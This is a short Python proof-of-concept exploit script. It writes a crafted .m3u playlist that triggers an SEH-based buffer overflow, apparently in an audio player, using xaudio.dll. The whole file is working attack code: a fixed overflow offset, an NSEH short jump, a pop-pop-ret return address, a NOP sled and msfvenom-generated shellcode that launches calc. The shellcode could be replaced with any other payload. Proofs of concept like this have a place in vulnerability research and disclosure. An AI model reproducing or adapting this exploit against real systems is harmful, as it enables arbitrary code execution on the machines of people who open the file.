def main():
	filename = "mill_test.m3u"
	prepend = "http://"
	# NSEH offset is 4103
	# SEH offset is 4107
	offset = "A" * 4103
  # jump over null bytes in shellcode area following SEH
	nseh = "\xeb\x1e\x90\x90"
	# pop pop ret found at 0x1001b3e6 in xaudio.dll
	seh = "\xe6\xb3\x01\x10"
  # nops to provide space for jump insto shellcode
	nops = "\x90" * 50
  # msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x0a\x0d\x20\x1a"
	buf =  ""
	buf += "\xdb\xcb\xd9\x74\x24\xf4\xb8\x9a\x2e\x83\xbe\x5f\x2b"
	buf += "\xc9\xb1\x30\x31\x47\x18\x83\xc7\x04\x03\x47\x8e\xcc"
	buf += "\x76\x42\x46\x92\x79\xbb\x96\xf3\xf0\x5e\xa7\x33\x66"
	buf += "\x2a\x97\x83\xec\x7e\x1b\x6f\xa0\x6a\xa8\x1d\x6d\x9c"
	buf += "\x19\xab\x4b\x93\x9a\x80\xa8\xb2\x18\xdb\xfc\x14\x21"
	buf += "\x14\xf1\x55\x66\x49\xf8\x04\x3f\x05\xaf\xb8\x34\x53"
	buf += "\x6c\x32\x06\x75\xf4\xa7\xde\x74\xd5\x79\x55\x2f\xf5"
	buf += "\x78\xba\x5b\xbc\x62\xdf\x66\x76\x18\x2b\x1c\x89\xc8"
	buf += "\x62\xdd\x26\x35\x4b\x2c\x36\x71\x6b\xcf\x4d\x8b\x88"
	buf += "\x72\x56\x48\xf3\xa8\xd3\x4b\x53\x3a\x43\xb0\x62\xef"
	buf += "\x12\x33\x68\x44\x50\x1b\x6c\x5b\xb5\x17\x88\xd0\x38"
	buf += "\xf8\x19\xa2\x1e\xdc\x42\x70\x3e\x45\x2e\xd7\x3f\x95"
	buf += "\x91\x88\xe5\xdd\x3f\xdc\x97\xbf\x55\x23\x25\xba\x1b"
	buf += "\x23\x35\xc5\x0b\x4c\x04\x4e\xc4\x0b\x99\x85\xa1\xe4"
	buf += "\xd3\x84\x83\x6c\xba\x5c\x96\xf0\x3d\x8b\xd4\x0c\xbe"
	buf += "\x3e\xa4\xea\xde\x4a\xa1\xb7\x58\xa6\xdb\xa8\x0c\xc8"
	buf += "\x48\xc8\x04\xab\x0f\x5a\xc4\x2c"
	
	attack_string = prepend + offset + nseh + seh + nops + buf
	
	file = open(filename,"w")
	file.write(attack_string)
	file.close()


if __name__ == '__main__':
	main()
